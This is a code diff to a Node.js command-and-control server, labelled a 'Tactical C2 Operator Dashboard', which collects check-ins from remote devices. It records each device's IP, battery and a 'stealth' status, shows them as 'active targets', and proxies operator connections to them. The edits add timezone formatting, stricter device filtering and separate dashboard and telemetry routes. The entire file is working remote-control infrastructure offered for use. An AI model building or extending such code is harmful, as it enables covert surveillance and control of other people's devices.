@@ -28,6 +28,24 @@ const telemetryLogs = [];
 
 const DATA_FILE = path.join(__dirname, 'devices.json');
 
+// Timezone formatter for Ottawa, Canada (America/Toronto)
+function formatTime(isoString) {
+    try {
+        return new Date(isoString || Date.now()).toLocaleString('en-US', {
+            timeZone: 'America/Toronto',
+            year: 'numeric',
+            month: 'short',
+            day: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: true
+        });
+    } catch (e) {
+        return new Date(isoString || Date.now()).toLocaleString();
+    }
+}
+
 function loadData() {
     try {
         if (fs.existsSync(DATA_FILE)) {
@@ -35,7 +53,9 @@ function loadData() {
             const json = JSON.parse(raw);
             if (json.devices && Array.isArray(json.devices)) {
                 json.devices.forEach(d => {
-                    if (d && d.deviceId) devices.set(d.deviceId, d);
+                    if (d && d.deviceId && d.model && d.model !== 'Unknown') {
+                        devices.set(d.deviceId, d);
+                    }
                 });
             }
             if (json.logs && Array.isArray(json.logs)) {
@@ -148,23 +168,22 @@ app.all('/proxy*', (req, res) => {
     }, 25000);
 });
 
-// Universal Check-In Handler (supports GET with query params, POST JSON, etc.)
+// Device Check-In Handler
 function handleCheckin(req, res) {
     try {
         const data = req.body || {};
         const queryData = req.query || {};
         const merged = { ...queryData, ...data };
 
-        // If it's a plain browser GET request with no check-in query parameters, serve the dashboard HTML
-        if (req.method === 'GET' && Object.keys(queryData).length === 0) {
-            return serveDashboard(req, res);
+        const rawModel = merged.model || merged.device || merged.deviceId || queryData.device || queryData.model;
+        if (!rawModel || rawModel === 'Unknown Device') {
+            return res.status(400).json({ success: false, error: 'Missing device model/identifier' });
         }
 
-        const rawModel = merged.model || merged.device || merged.deviceId || queryData.device || queryData.model || 'SM-F731W';
         const deviceId = rawModel.replace(/\s*\(API\s*\d+\)/i, '').trim();
 
         for (const [key, val] of devices.entries()) {
-            if (key === deviceId || val.ip === merged.ip || key.includes(deviceId) || deviceId.includes(key)) {
+            if (key === deviceId || val.ip === merged.ip || key.includes(deviceId) || deviceId.includes(key) || key === 'Unknown Device') {
                 devices.delete(key);
             }
         }
@@ -172,6 +191,7 @@ function handleCheckin(req, res) {
         devices.set(deviceId, {
             ...merged,
             deviceId,
+            model: deviceId,
             lastSeen: new Date().toISOString()
         });
 
@@ -186,10 +206,6 @@ function handleCheckin(req, res) {
         saveData();
 
         console.log(`[CHECKIN SUCCESS] Device ID: ${deviceId} | IP: ${merged.ip}`);
-
-        if (req.method === 'GET') {
-            return res.json({ success: true, message: 'Check-in ingested via GET' });
-        }
         res.json({ success: true, message: 'Telemetry received successfully' });
     } catch (err) {
         console.error('[ERROR] Checkin failed:', err.message);
@@ -199,7 +215,7 @@ function handleCheckin(req, res) {
 
 // Tactical C2 Operator Dashboard (HTML)
 function serveDashboard(req, res) {
-    const deviceList = Array.from(devices.values());
+    const deviceList = Array.from(devices.values()).filter(d => d.model && d.model !== 'Unknown Device');
 
     let devicesHtml = deviceList.length === 0 ?
         '<tr><td colspan="8" style="text-align: center; color: #888; padding: 30px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
@@ -211,7 +227,7 @@ function serveDashboard(req, res) {
                 <td>${d.battery || 'N/A'}</td>
                 <td style="font-family: monospace; color: var(--neon-green);">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                 <td>${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
-                <td style="font-size: 0.75rem; color: #aaa;">${new Date(d.lastSeen).toLocaleTimeString()}</td>
+                <td style="font-size: 0.75rem; color: #aaa;">${formatTime(d.lastSeen)}</td>
                 <td><a href="/proxy/?deviceId=${d.model || d.deviceId}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
             </tr>
         `).join('');
@@ -220,7 +236,7 @@ function serveDashboard(req, res) {
         '<tr><td colspan="3" style="text-align: center; color: #888; padding: 20px;">NO TELEMETRY LOGS RECORDED</td></tr>' :
         telemetryLogs.slice(0, 50).map(l => `
             <tr>
-                <td style="font-size: 0.7rem; color: #888; white-space: nowrap;">${new Date(l.timestamp).toLocaleTimeString()}</td>
+                <td style="font-size: 0.7rem; color: #888; white-space: nowrap;">${formatTime(l.timestamp)}</td>
                 <td style="font-family: monospace; color: var(--neon-cyan);">${l.deviceId}</td>
                 <td style="font-family: monospace; font-size: 0.75rem;">${JSON.stringify(l.payload)}</td>
             </tr>
@@ -243,7 +259,7 @@ function serveDashboard(req, res) {
     <div class="container">
         <div class="header" style="text-align:center; padding:20px 0; margin-bottom:20px;">
             <img src="/c2/header_dashboard.png" style="width: 90%; max-width: 900px; height: auto; margin: 0 auto; display: block; object-fit: contain;" alt="LAB-RATS Header">
-            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 15px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${devices.size}</span></div>
+            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 15px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
         </div>
 
         <div class="card" style="margin-top: 20px;">
@@ -296,8 +312,8 @@ function serveDashboard(req, res) {
     res.send(html);
 }
 
-// Register routing handlers supporting both GET and POST with query params
-app.get('/', handleCheckin);
+// Separate Routing: GET / serves dashboard, POST / & /checkin handle telemetry
+app.get('/', serveDashboard);
 app.get('/checkin', handleCheckin);
 app.post('/', handleCheckin);
 app.post('/checkin', handleCheckin);
